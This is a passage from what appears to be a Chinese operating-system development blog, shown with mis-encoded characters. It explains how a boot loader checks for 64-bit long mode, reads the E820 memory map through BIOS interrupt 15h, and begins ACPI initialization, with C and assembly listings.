å°†0x80000001ç§»åŠ¨åˆ°EAXå¯„å­˜å™¨ä¸­</span></span><br><span class="line">        <span class="string">&quot;cpuid \n\t&quot;</span> <span class="comment">// å†æ¬¡æ‰§è¡ŒCPUIDæŒ‡ä»¤ï¼Œè¿™æ¬¡CPUIDè°ƒç”¨æ˜¯ä¸ºäº†è·å–æ‰©å±•åŠŸèƒ½ä¿¡æ¯</span></span><br><span class="line">        <span class="string">&quot;bt $29,%%edx \n\t&quot;</span> <span class="comment">// æ£€æŸ¥EDXå¯„å­˜å™¨çš„ç¬¬29ä½ï¼ˆé•¿æ¨¡å¼æ”¯æŒä½ï¼‰ï¼Œå¦‚æœç¬¬29ä½ä¸º1ï¼Œè¡¨ç¤ºæ”¯æŒé•¿æ¨¡å¼</span></span><br><span class="line">        <span class="string">&quot;setcb %%al \n\t&quot;</span> <span class="comment">// å¦‚æœç¬¬29ä½ä¸º1ï¼Œå°†ALè®¾ç½®ä¸º1</span></span><br><span class="line">        <span class="string">&quot;1: \n\t&quot;</span> <span class="comment">// æ ‡ç­¾1</span></span><br><span class="line">        <span class="string">&quot;movzx %%al,%%eax \n\t&quot;</span> <span class="comment">// å°†ALçš„å€¼æ‰©å±•åˆ°EAXå¯„å­˜å™¨ä¸­</span></span><br><span class="line">        : <span class="string">&quot;=a&quot;</span>(rets)</span><br><span class="line">        : </span><br><span class="line">        : </span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">return</span> rets; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœä»¥ä¸Šæ£€æµ‹éƒ½é€šè¿‡äº†ï¼Œå°±åœ¨ä¸Šé¢çš„machbstart_tä¿¡æ¯ç»“æ„ä¸­å¡«å…¥cpuæ¨¡å¼ä¸º64</p><h2 id="è·å–å†…å­˜å¸ƒå±€"><a href="#è·å–å†…å­˜å¸ƒå±€" class="headerlink" title="è·å–å†…å­˜å¸ƒå±€"></a>è·å–å†…å­˜å¸ƒå±€</h2><p>æˆ‘ä»¬å…ˆæ¥äº†è§£ä¸€ä¸‹è¦è·å¾—çš„ä¿¡æ¯å¦‚ä½•å‚¨å­˜</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RAM_USABLE 1 <span class="comment">//å¯ç”¨å†…å­˜</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RAM_RESERV 2 <span class="comment">//ä¿ç•™å†…å­˜ä¸å¯ä½¿ç”¨</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RAM_ACPIREC 3 <span class="comment">//ACPIè¡¨ç›¸å…³çš„</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RAM_ACPINVS 4 <span class="comment">//ACPI NVSç©ºé—´</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RAM_AREACON 5 <span class="comment">//åŒ…å«åå†…å­˜</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">s_e820</span>&#123;</span></span><br><span class="line">    <span class="keyword">u64_t</span> saddr;    <span class="comment">//å†…å­˜å¼€å§‹åœ°å€</span></span><br><span class="line">    <span class="keyword">u64_t</span> lsize;    <span class="comment">//å†…å­˜å¤§å°</span></span><br><span class="line">    <span class="keyword">u32_t</span> type;    <span class="comment">//å†…å­˜ç±»å‹ </span></span><br><span class="line">&#125;<span class="keyword">e820map_t</span>;</span><br></pre></td></tr></table></figure><p>è·å–çš„å†…å­˜å¸ƒå±€ä¿¡æ¯å°±ä¿å­˜åœ¨è¿™æ ·çš„ç»“æ„ä½“æ•°ç»„ã€‚è€Œæˆ‘ä»¬è¦é€šè¿‡init_memå‡½æ•°æ¥è·å–è¿™æ ·çš„ç»“æ„ä½“æ•°ç»„ï¼Œå¹¶å¯¹å†…å­˜è¿›è¡Œæ£€æµ‹</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_mem</span><span class="params">(<span class="keyword">machbstart_t</span> *mbsp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">e820map_t</span> *retemp;</span><br><span class="line">    <span class="keyword">u32_t</span> retemnr = <span class="number">0</span>;</span><br><span class="line">    mbsp-&gt;mb_ebdaphyadr = acpi_get_bios_ebda();<span class="comment">//è·å– EBDA çš„ç‰©ç†åœ°å€å¹¶å­˜å‚¨åœ¨ mbsp-&gt;mb_ebdaphyadr ä¸­</span></span><br><span class="line">    mmap(&amp;retemp, &amp;retemnr);<span class="comment">// è°ƒç”¨ mmap å‡½æ•°è·å– e820map_t ç»“æ„ä½“çš„ä¿¡æ¯</span></span><br><span class="line">    <span class="keyword">if</span> (retemnr == <span class="number">0</span>)<span class="comment">// æ£€æŸ¥æ˜¯å¦æˆåŠŸè·å–äº† e820map</span></span><br><span class="line">    &#123;</span><br><span class="line">        kerror(<span class="string">&quot;no e820map\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (chk_memsize(retemp, retemnr, <span class="number">0x100000</span>, <span class="number">0x8000000</span>) == <span class="literal">NULL</span>)<span class="comment">// æ£€æŸ¥å†…å­˜å¤§å°æ˜¯å¦æ»¡è¶³è¦æ±‚</span></span><br><span class="line">    &#123;</span><br><span class="line">        kerror(<span class="string">&quot;Your computer is low on memory, the memory cannot be less than 128MB!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    mbsp-&gt;mb_e820padr = (<span class="keyword">u64_t</span>)((<span class="keyword">u32_t</span>)(retemp));<span class="comment">//æŠŠe820map_tç»“æ„æ•°ç»„çš„é¦–åœ°å€ä¼ ç»™mbsp-&gt;mb_e820padr</span></span><br><span class="line">    mbsp-&gt;mb_e820nr = (<span class="keyword">u64_t</span>)retemnr;<span class="comment">//æŠŠe820map_tç»“æ„æ•°ç»„å…ƒç´ ä¸ªæ•°ä¼ ç»™mbsp-&gt;mb_e820nr</span></span><br><span class="line">    mbsp-&gt;mb_e820sz = retemnr * (<span class="keyword">sizeof</span>(<span class="keyword">e820map_t</span>));<span class="comment">//æŠŠe820map_tç»“æ„æ•°ç»„å¤§å°ä¼ ç»™mbsp-&gt;mb_e820sz</span></span><br><span class="line">    mbsp-&gt;mb_memsz = get_memsize(retemp, retemnr);<span class="comment">//æ ¹æ®e820map_tç»“æ„æ•°æ®è®¡ç®—å†…å­˜å¤§å°ã€‚</span></span><br><span class="line">    init_acpi(mbsp);<span class="comment">//è°ƒç”¨ init_acpi å‡½æ•°è¿›è¡Œ ACPI åˆå§‹åŒ–</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>acpi_get_bios_ebdaæ˜¯å°†EBDAçš„åœ°å€è¿”å›ï¼Œæˆ‘ä»¬é‡ç‚¹çœ‹çœ‹mmapå‡½æ•°</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmap</span><span class="params">(<span class="keyword">e820map_t</span> **retemp, <span class="keyword">u32_t</span> *retemnr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    realadr_call_entry(RLINTNR(<span class="number">0</span>), <span class="number">0</span>, <span class="number">0</span>); <span class="comment">//eax = 0 edx = 0 ecx = 0</span></span><br><span class="line">    *retemnr = *((<span class="keyword">u32_t</span> *)(E80MAP_NR));</span><br><span class="line">    *retemp = (<span class="keyword">e820map_t</span> *)(*((<span class="keyword">u32_t</span> *)(E80MAP_ADRADR)));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„realadr_call_entryå‚æ•°eaxä¸º0ï¼Œå…¶è°ƒç”¨çš„æ˜¯realintsve.asmæ–‡ä»¶ä¸­func_tableç¬¬ä¸€ä¸ªå‡½æ•°_getmmapï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹è¿™ä¸ªæ±‡ç¼–å‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_getmmap:</span><br><span class="line">    push ds</span><br><span class="line">    push es</span><br><span class="line">    push ss</span><br><span class="line">    mov esi,0</span><br><span class="line">    mov dword[E80MAP_NR],esi;E80MAP_NRè®¾ä¸º0</span><br><span class="line">    mov dword[E80MAP_ADRADR],E80MAP_ADR;e820mapç»“æ„ä½“å¼€å§‹åœ°å€</span><br><span class="line">    xor ebx,ebx ;ebxè®¾ç½®ä¸º0</span><br><span class="line">    mov edi,E80MAP_ADR;å°†E80MAP_ADRä¼ é€’ç»™edi,å­˜å‚¨e820mapç»“æ„çš„åˆå§‹ä½ç½®</span><br><span class="line">loop:</span><br><span class="line">    mov eax,0e820h;è·å–e820mapç»“æ„å‚æ•°</span><br><span class="line">mov ecx,20;è¾“å‡ºç»“æœæ•°æ®é¡¹çš„å¤§å°ä¸º20å­—èŠ‚ï¼š8å­—èŠ‚å†…å­˜åŸºåœ°å€ï¼Œ8å­—èŠ‚å†…å­˜é•¿åº¦ï¼Œ4å­—èŠ‚å†…å­˜ç±»å‹</span><br><span class="line">mov edx,0534d4150h;è·å–e820mapç»“æ„å‚æ•°å¿…é¡»æ˜¯è¿™ä¸ªæ•°æ®</span><br><span class="line">int 15h;BIOSçš„15hä¸­æ–­</span><br><span class="line">jc .1;å¦‚æœè¿›ä½æ ‡å¿—è¢«è®¾ç½®ï¼ˆè¡¨ç¤ºå‡ºç°é”™è¯¯ï¼‰ï¼Œè·³è½¬åˆ°æ ‡ç­¾ .1</span><br><span class="line">add edi,20;å°† edi çš„å€¼å¢åŠ  20ï¼ˆç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªå†…å­˜ä½ç½®ï¼‰</span><br><span class="line">cmp edi,E80MAP_ADR+0x1000;å°† edi ä¸ E80MAP_ADR + 0x1000 è¿›è¡Œæ¯”è¾ƒ</span><br><span class="line">jg .1;å¦‚æœ edi å¤§äº E80MAP_ADR + 0x1000ï¼Œè·³è½¬åˆ°æ ‡ç­¾ .1</span><br><span class="line">inc esi;å¢åŠ  esi çš„å€¼ï¼ˆå¾ªç¯è®¡æ•°å™¨ï¼‰</span><br><span class="line">cmp ebx,0;å°† ebx ä¸é›¶è¿›è¡Œæ¯”è¾ƒ</span><br><span class="line">jne loop;å¦‚æœ ebx ä¸ç­‰äºé›¶ï¼Œåˆ™é‡å¤å¾ªç¯</span><br><span class="line">jmp .2</span><br><span class="line"></span><br><span class="line">.1:</span><br><span class="line">mov esi,0;å°† esi çš„å€¼é‡ç½®ä¸ºé›¶</span><br><span class="line"></span><br><span class="line">.2:</span><br><span class="line">mov dword[E80MAP_NR],esi;å°†æœ€ç»ˆçš„ esi å€¼å­˜å‚¨åˆ°ç”± E80MAP_NR æŒ‡å‘çš„å†…å­˜ä½ç½®</span><br><span class="line">pop ss</span><br><span class="line">pop es</span><br><span class="line">pop ds</span><br><span class="line">ret    </span><br></pre></td></tr></table></figure><p>æˆ‘å…ˆç®€å•è¯´æ˜ä¸€ä¸‹int 15hè°ƒç”¨e820hçš„å„ä¸ªå‚æ•°</p><table><thead><tr><th>Register</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>EAX</td><td><strong>E820h</strong>è¿™æ˜¯ç”¨æ¥æŒ‡ç¤ºBIOSè·å–ç³»ç»Ÿå†…å­˜æ˜ å°„çš„åŠŸèƒ½ç </td></tr><tr><td>EBX</td><td>åŒ…å«è·å–ä¸‹ä¸€ä¸ªç‰©ç†å†…å­˜èŒƒå›´çš„ç»­ä¼ å€¼ã€‚è¿™æ˜¯æ­¤ä¾‹ç¨‹ä¹‹å‰è°ƒç”¨è¿”å›çš„å€¼ã€‚å¦‚æœè¿™æ˜¯ç¬¬ä¸€æ¬¡è°ƒç”¨ï¼ŒEBXå¿…é¡»åŒ…å«é›¶ã€‚</td></tr><tr><td>ES:DI</td><td>ç¼“å†²åŒºæŒ‡é’ˆæŒ‡å‘åœ°å€èŒƒå›´æè¿°ç¬¦ç»“æ„çš„æŒ‡é’ˆï¼ŒBIOSä¼šå¡«å……è¿™ä¸ªç»“æ„ã€‚</td></tr><tr><td>ECX</td><td>ç¼“å†²åŒºå¤§å°ä¼ é€’ç»™BIOSçš„ç»“æ„çš„é•¿åº¦ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ã€‚BIOSä¼šå¡«å……ECXå¯„å­˜å™¨ä¸­æŒ‡ç¤ºçš„ç»“æ„çš„å­—èŠ‚æ•°æœ€å°å¤§å°æ˜¯20å­—èŠ‚</td></tr><tr><td>EDX</td><td>ç­¾åâ€˜SMAPâ€™ ç”±BIOSä½¿ç”¨ï¼Œä»¥éªŒè¯è°ƒç”¨è€…æ˜¯å¦è¯·æ±‚å°†ç³»ç»Ÿæ˜ å°„ä¿¡æ¯è¿”å›åˆ°ES:DIä¸­ã€‚</td></tr></tbody></table><p>ä¸Šé¢çš„å‡½æ•°å°†ebxè®¾ç½®ä¸º0ï¼Œå°†ediè®¾ç½®ä¸ºå­˜å‚¨e820mapç»“æ„çš„åˆå§‹ä½ç½®ã€‚æ¥ä¸‹æ¥è¿›å…¥å¾ªç¯ï¼Œå¦‚æœä¸­é€”å‡ºé”™æˆ–è€…å†…å­˜ç©ºé—´ä¸è¶³ä»¥è·å–å†…å­˜ç©ºé—´å°±å°†esiå€¼è®¾ç½®ä¸º0ï¼Œä»¥ä¾¿åç»­æŠ¥é”™ï¼Œå¦‚æœæ­£å¸¸è·å–ï¼Œå½“ebxå€¼ä¸º0æ—¶ï¼Œè¯æ˜è·å–å®Œæ¯•ï¼Œå‘E80MAP_NRåœ°å€å¡«å…¥æœ‰å¤šå°‘å€¼ï¼Œè¿”å›ä¹‹å‰çš„å‡½æ•°å³å¯ã€‚</p><p>æˆ‘ä»¬å›çœ‹ä¹‹å‰çš„init _memå‡½æ•°ï¼Œå¦‚æœretemnrä¹Ÿå°±æ˜¯ä¹‹å‰çš„E80MAP_NRä¸º0çš„è¯ï¼ŒæŠ¥é”™ï¼›å¦‚æœæ­£å¸¸çš„è¯è¿›è¡Œä¸‹ä¸€æ­¥ã€‚æ¥ä¸‹æ¥è°ƒç”¨chk_memsizeï¼Œè¯¥å‡½æ•°æ˜¯æ£€æŸ¥å†…å­˜å¤§å°æ˜¯å¦æ»¡è¶³è¦æ±‚ã€‚ä¹‹åå‘machbstart_tç»“æ„ä¸­å¡«å…¥ç›¸å…³æ•°æ®ï¼Œåœ¨è¿™ä¸ªå‡½æ•°çš„æœ€åï¼Œè·å–MRSDPã€‚åœ¨è°ƒç”¨ <code>int 15h</code> ä¸­æ–­ï¼Œ<code>eax = e820h</code> åŠŸèƒ½æ—¶ï¼Œæ‰€è¿”å›çš„â€œå†…å­˜åŒºåŸŸâ€æ˜¯æŒ‡ç³»ç»Ÿç‰©ç†åœ°å€ç©ºé—´ä¸­çš„ç‰¹å®šåŒºé—´ï¼ˆé€šå¸¸ä»¥èµ·å§‹åœ°å€å’Œé•¿åº¦æè¿°ï¼‰ã€‚è¿™äº›åŒºåŸŸæœ‰ä¸åŒçš„åŠŸèƒ½å’Œç”¨é€”ï¼Œå®ƒä»¬å…±åŒæ„æˆäº†ç³»ç»Ÿç‰©ç†å†…å­˜çš„å®Œæ•´å¸ƒå±€ã€‚</p><p>å…·ä½“æ¥è¯´ï¼Œè¿™äº›å†…å­˜åŒºåŸŸå¯ä»¥æ˜¯ä»¥ä¸‹å‡ ç§ç±»å‹ï¼š</p><hr><h3 id="1-å¯ç”¨å†…å­˜åŒºåŸŸ-Usable-Memory"><a href="#1-å¯ç”¨å†…å­˜åŒºåŸŸ-Usable-Memory" class="headerlink" title="1. å¯ç”¨å†…å­˜åŒºåŸŸ (Usable Memory)"></a><strong>1. å¯ç”¨å†…å­˜åŒºåŸŸ (Usable Memory)</strong></h3><ul><li><p><strong>æè¿°</strong>ï¼šå¯ä»¥ä¾›æ“ä½œç³»ç»Ÿè‡ªç”±ä½¿ç”¨çš„å†…å­˜ã€‚</p></li><li><p><strong>æ ‡è¯†</strong>ï¼š<code>Type = 1</code></p></li><li><p>ç”¨é€”</p><p>ï¼š</p><ul><li>è¿™éƒ¨åˆ†å†…å­˜æ˜¯æ“ä½œç³»ç»Ÿç”¨äºåˆ†é…åº”ç”¨ç¨‹åºå†…å­˜çš„ä¸»è¦åŒºåŸŸã€‚</li><li>å…¸å‹çš„å¯ç”¨å†…å­˜åŒºåŸŸé€šå¸¸ä»ä½åœ°å€å¼€å§‹ï¼ˆä¾‹å¦‚1MBä»¥ä¸Šï¼‰ç›´åˆ°ç³»ç»Ÿç‰©ç†å†…å­˜çš„ä¸Šé™ã€‚</li></ul></li><li><p>èŒƒå›´</p><p>ï¼š</p><ul><li>åœ¨ä¼ ç»Ÿx86ç³»ç»Ÿä¸­ï¼Œé€šå¸¸å¯ç”¨å†…å­˜ä» 1MB åˆ°çº¦ 3GB æˆ–æ›´é«˜ï¼ˆå…·ä½“ä¾èµ–äºç¡¬ä»¶é…ç½®ï¼‰ã€‚</li></ul></li></ul><hr><h3 id="2-ä¿ç•™å†…å­˜åŒºåŸŸ-Reserved-Memory"><a href="#2-ä¿ç•™å†…å­˜åŒºåŸŸ-Reserved-Memory" class="headerlink" title="2. ä¿ç•™å†…å­˜åŒºåŸŸ (Reserved Memory)"></a><strong>2. ä¿ç•™å†…å­˜åŒºåŸŸ (Reserved Memory)</strong></h3><ul><li><p><strong>æè¿°</strong>ï¼šå·²è¢«ç³»ç»Ÿæˆ–ç¡¬ä»¶è®¾å¤‡ä½¿ç”¨çš„å†…å­˜åŒºåŸŸï¼Œæ“ä½œç³»ç»Ÿä¸èƒ½è‡ªç”±è®¿é—®ã€‚</p></li><li><p><strong>æ ‡è¯†</strong>ï¼š<code>Type = 2</code></p></li><li><p>ç”¨é€”</p><p>ï¼š</p><ul><li>BIOSå ç”¨ï¼šBIOSä»£ç æˆ–æ•°æ®éœ€è¦å­˜å‚¨åœ¨ç‰©ç†å†…å­˜çš„æŸäº›åœ°å€ã€‚</li><li>æ˜ å°„åˆ°è®¾å¤‡ï¼šç¡¬ä»¶è®¾å¤‡å¯èƒ½ä¼šå°†å†…å­˜æ˜ å°„åˆ°ç‰¹å®šåœ°å€ï¼Œæ¯”å¦‚æ˜¾å¡å¸§ç¼“å†²åŒºã€‚</li><li>ä¸å¯ç”¨åŒºåŸŸï¼šå…¶ä»–å¯èƒ½æ— æ³•ä½¿ç”¨çš„åŒºåŸŸï¼ˆä¾‹å¦‚ç‰©ç†åœ°å€ä¸è¿ç»­æ—¶çš„é—´éš™ï¼‰ã€‚</li></ul></li><li><p>ä¾‹å­</p><p>ï¼š</p><ul><li>é€šå¸¸åœ¨ 0xA0000 åˆ° 0xFFFFF ä¹‹é—´ä¼šæœ‰ä¸€éƒ¨åˆ†å†…å­˜ä¿ç•™ç»™ BIOS å’Œæ˜¾å¡ã€‚</li></ul></li></ul><hr><h3 id="3-ACPI-å¯å›æ”¶å†…å­˜åŒºåŸŸ-ACPI-Reclaimable-Memory"><a href="#3-ACPI-å¯å›æ”¶å†…å­˜åŒºåŸŸ-ACPI-Reclaimable-Memory" class="headerlink" title="3. ACPI å¯å›æ”¶å†…å­˜åŒºåŸŸ (ACPI Reclaimable Memory)"></a><strong>3. ACPI å¯å›æ”¶å†…å­˜åŒºåŸŸ (ACPI Reclaimable Memory)</strong></h3><ul><li><p><strong>æè¿°</strong>ï¼šACPIï¼ˆAdvanced Configuration and Power Interfaceï¼Œé«˜çº§é…ç½®å’Œç”µæºæ¥å£ï¼‰ä½¿ç”¨çš„å†…å­˜åŒºåŸŸï¼Œä½†åœ¨ç³»ç»Ÿå¯åŠ¨å®Œæˆåï¼Œå¯ä»¥å›æ”¶ä¾›æ“ä½œç³»ç»Ÿä½¿ç”¨ã€‚</p></li><li><p><strong>æ ‡è¯†</strong>ï¼š<code>Type = 3</code></p></li><li><p>ç”¨é€”</p><p>ï¼š</p><ul><li>ç”¨äºå­˜å‚¨ ACPI è¡¨ç­‰é…ç½®æ•°æ®ã€‚</li><li>æ“ä½œç³»ç»Ÿå¯åŠ¨åï¼ˆå®Œæˆå¼•å¯¼é˜¶æ®µï¼‰ï¼ŒACPI æ•°æ®è¢«è¯»å–åï¼Œè¿™éƒ¨åˆ†å†…å­˜å¯ä»¥é‡Šæ”¾ã€‚</li></ul></li></ul><hr><h3 id="4-ACPI-NVSï¼ˆNon-Volatile-Storageï¼‰åŒºåŸŸ"><a href="#4-ACPI-NVSï¼ˆNon-Volatile-Storageï¼‰åŒºåŸŸ" class="headerlink" title="4. ACPI NVSï¼ˆNon-Volatile Storageï¼‰åŒºåŸŸ"></a><strong>4. ACPI NVSï¼ˆNon-Volatile Storageï¼‰åŒºåŸŸ</strong></h3><ul><li><p><strong>æè¿°</strong>ï¼šACPI éæ˜“å¤±å­˜å‚¨ï¼ˆACPI NVSï¼‰çš„å†…å­˜åŒºåŸŸã€‚</p></li><li><p><strong>æ ‡è¯†</strong>ï¼š<code>Type = 4</code></p></li><li><p>ç”¨é€”</p><p>ï¼š</p><ul><li>ç”¨äº ACPI å›ºå®šçš„æ•°æ®å­˜å‚¨ï¼ˆå¦‚ç³»ç»Ÿä¼‘çœ æˆ–è®¾å¤‡çŠ¶æ€ä¿å­˜ï¼‰ã€‚</li><li>æ“ä½œç³»ç»Ÿä¸èƒ½å ç”¨æˆ–ä¿®æ”¹æ­¤åŒºåŸŸçš„å†…å®¹ã€‚</li></ul></li><li><p>å…¸å‹ç‰¹æ€§</p><p>ï¼š</p><ul><li>æ¯”å¦‚ï¼Œåœ¨ç³»ç»Ÿè¿›å…¥ S3ã€S4ï¼ˆç¡çœ æˆ–ä¼‘çœ ï¼‰æ¨¡å¼æ—¶ï¼Œè¿™äº›åŒºåŸŸå­˜å‚¨æ¢å¤æ‰€éœ€çš„æ•°æ®ã€‚</li></ul></li></ul><hr><h3 id="5-æœªå®šä¹‰-ä¸“ç”¨ç”¨é€”çš„å†…å­˜åŒºåŸŸ"><a href="#5-æœªå®šä¹‰-ä¸“ç”¨ç”¨é€”çš„å†…å­˜åŒºåŸŸ" class="headerlink" title="5. æœªå®šä¹‰/ä¸“ç”¨ç”¨é€”çš„å†…å­˜åŒºåŸŸ"></a><strong>5. æœªå®šä¹‰/ä¸“ç”¨ç”¨é€”çš„å†…å­˜åŒºåŸŸ</strong></h3><ul><li><p><strong>æè¿°</strong>ï¼šå…¶ä»–ä¿ç•™çš„æˆ–ç¡¬ä»¶ç‰¹å®šçš„å†…å­˜åŒºåŸŸï¼Œå…·ä½“ç”¨é€”é€šå¸¸ç”±ç¡¬ä»¶è®¾å¤‡æˆ–ç³»ç»Ÿè®¾è®¡å†³å®šã€‚</p></li><li><p><strong>æ ‡è¯†</strong>ï¼š<code>Type = 5</code>ï¼ˆæˆ–å…¶ä»–æœªå®šä¹‰å€¼ï¼‰</p></li><li><p>ç”¨é€”</p><p>ï¼š</p><ul><li>ä¸“ç”¨ç¡¬ä»¶å¯èƒ½éœ€è¦çš„å†…å­˜åŒºï¼ˆå¦‚ DMA çš„ç¼“å†²åŒºã€æ˜¾å¡ç‰¹å®šç¼“å†²åŒºç­‰ï¼‰ã€‚</li><li>æœ‰äº›å€¼å¯èƒ½æ˜¯ä¿ç•™ç»™æœªæ¥æ‰©å±•ä½¿ç”¨çš„ã€‚</li></ul></li></ul><hr><h3 id="6-è§†é¢‘å†…å­˜åŒºåŸŸ-ç‰¹æ®Šç”¨é€”"><a href="#6-è§†é¢‘å†…å­˜åŒºåŸŸ-ç‰¹æ®Šç”¨é€”" class="headerlink" title="6. è§†é¢‘å†…å­˜åŒºåŸŸ (ç‰¹æ®Šç”¨é€”)"></a><strong>6. è§†é¢‘å†…å­˜åŒºåŸŸ (ç‰¹æ®Šç”¨é€”)</strong></h3><ul><li><p><strong>æè¿°</strong>ï¼šæŸäº›å†…å­˜åœ°å€å¯èƒ½ç›´æ¥æ˜ å°„åˆ°ç¡¬ä»¶è®¾å¤‡ï¼Œä¾‹å¦‚æ˜¾å¡çš„å¸§ç¼“å†²åŒºã€‚</p></li><li><p>ç”¨é€”</p><p>ï¼š</p><ul><li>é€šå¸¸åœ¨ 0xA0000 åˆ° 0xBFFFF åŒºé—´ï¼Œè¿™æ˜¯ä¼ ç»Ÿçš„æ˜¾å­˜åŒºåŸŸï¼Œç”¨äºæ˜¾ç¤ºæ•°æ®ã€‚</li><li>é«˜åœ°å€çš„éƒ¨åˆ†ä¹Ÿå¯èƒ½æ˜¯ PCIè®¾å¤‡æˆ–æ˜¾å¡å ç”¨ã€‚</li></ul></li></ul><hr><h3 id="7-å†…å­˜æ˜ å°„-I-O-åŒºåŸŸ"><a href="#7-å†…å­˜æ˜ å°„-I-O-åŒºåŸŸ" class="headerlink" title="7. å†…å­˜æ˜ å°„ I/O åŒºåŸŸ"></a><strong>7. å†…å­˜æ˜ å°„ I/O åŒºåŸŸ</strong></h3><ul><li><p><strong>æè¿°</strong>ï¼šéƒ¨åˆ†ç‰©ç†å†…å­˜åœ°å€å¯èƒ½æ˜ å°„åˆ°ç¡¬ä»¶è®¾å¤‡çš„å¯„å­˜å™¨ã€‚</p></li><li><p>ç”¨é€”</p><p>ï¼š</p><ul><li>æ¯”å¦‚ PCIè®¾å¤‡çš„é…ç½®ç©ºé—´ã€‚</li><li>CPUé€šè¿‡è¿™äº›åŒºåŸŸä¸ç¡¬ä»¶è®¾å¤‡é€šä¿¡ï¼Œè€ŒéçœŸæ­£çš„æ•°æ®å­˜å‚¨ç”¨é€”ã€‚</li></ul></li></ul><hr><h3 id="8-å…¸å‹å†…å­˜åŒºåŸŸåˆ’åˆ†ç¤ºä¾‹"><a href="#8-å…¸å‹å†…å­˜åŒºåŸŸåˆ’åˆ†ç¤ºä¾‹" class="headerlink" title="8. å…¸å‹å†…å­˜åŒºåŸŸåˆ’åˆ†ç¤ºä¾‹"></a><strong>8. å…¸å‹å†…å­˜åŒºåŸŸåˆ’åˆ†ç¤ºä¾‹</strong></h3><p>ä»¥ä¸€ä¸ªä¼ ç»Ÿçš„ 32 ä½ x86 ç³»ç»Ÿä¸ºä¾‹ï¼Œå…¸å‹çš„å†…å­˜åŒºåŸŸå¯èƒ½å¦‚ä¸‹ï¼š</p><table><thead><tr><th>èµ·å§‹åœ°å€</th><th>ç»“æŸåœ°å€</th><th>ç±»å‹</th><th>æè¿°</th></tr></thead><tbody><tr><td>0x00000000</td><td>0x0009FFFF</td><td>å¯ç”¨å†…å­˜</td><td>å¸¸è§„å†…å­˜ï¼ˆä½ 640KBï¼‰</td></tr><tr><td>0x000A0000</td><td>0x000BFFFF</td><td>ä¿ç•™å†…å­˜</td><td>è§†é¢‘å†…å­˜ï¼ˆVGA æ˜¾å­˜ï¼‰</td></tr><tr><td>0x000C0000</td><td>0x000FFFFF</td><td>ä¿ç•™å†…å­˜</td><td>BIOS æ•°æ®</td></tr><tr><td>0x00100000</td><td>0x7FFFFFFF</td><td>å¯ç”¨å†…å­˜</td><td>å¸¸è§„å†…å­˜ï¼ˆé«˜ 1MB ä»¥ä¸Šçš„ç³»ç»Ÿå¯ç”¨å†…å­˜ï¼‰</td></tr><tr><td>0x80000000</td><td>0xFFFFFFFF</td><td>ä¿ç•™/è®¾å¤‡æ˜ å°„åŒºåŸŸ</td><td>ç¡¬ä»¶ä¿ç•™ã€è®¾å¤‡æ˜ å°„åŒºã€PCIå†…å­˜æ˜ å°„ç­‰</td></tr></tbody></table><p>ç°ä»£ç³»ç»Ÿä¸­ï¼ˆç‰¹åˆ«æ˜¯ 64 ä½ç³»ç»Ÿï¼‰ï¼Œå†…å­˜åˆ’åˆ†æ›´åŠ å¤æ‚ï¼Œä¼šåŒ…æ‹¬å¤§äº 4GB çš„ç‰©ç†åœ°å€ç©ºé—´ã€‚</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬çœ‹çœ‹init_acpi(mbsp)å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ä¸»è¦æ˜¯å¯¹ACPIè¿›è¡Œä¸€ä¸ªåˆå§‹åŒ–ï¼Œ</p><h3 id="ACPIåˆå§‹åŒ–"><a href="#ACPIåˆå§‹åŒ–" class="headerlink" title="ACPIåˆå§‹åŒ–"></a>ACPIåˆå§‹åŒ–</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">PUBLIC <span class="keyword">void</span> <span class="title">init_acpi</span><span class="params">(<span class="keyword">machbstart_t</span> *mbsp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">mrsdp_t</span> *rdp = <span class="literal">NULL</span>;</span><br><span class="line">    rdp = find_acpi_rsdp();<span class="comment">//å°è¯•é€šè¿‡ find_acpi_rsdp å‡½æ•°æŸ¥æ‰¾ ACPI çš„æ ¹ç³»ç»Ÿæè¿°æŒ‡é’ˆ</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == rdp)<span class="comment">//æ£€æµ‹æŒ‡é’ˆæ˜¯å¦å­˜åœ¨</span></span><br><span class="line">    &#123;</span><br><span class="line">        kerror(<span class="string">&quot;Your computer is not support ACPI!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    m2mcopy(rdp, &amp;mbsp-&gt;mb_mrsdp, (<span class="keyword">sint_t</span>)((<span class="keyword">sizeof</span>(<span class="keyword">mrsdp_t</span>))));<span class="comment">//å°†ç»“æ„ä½“å¤åˆ¶è¿‡å»</span></span><br><span class="line">    <span class="keyword">if</span> (acpi_rsdp_isok(&amp;mbsp-&gt;mb_mrsdp) == <span class="literal">NULL</span>)<span 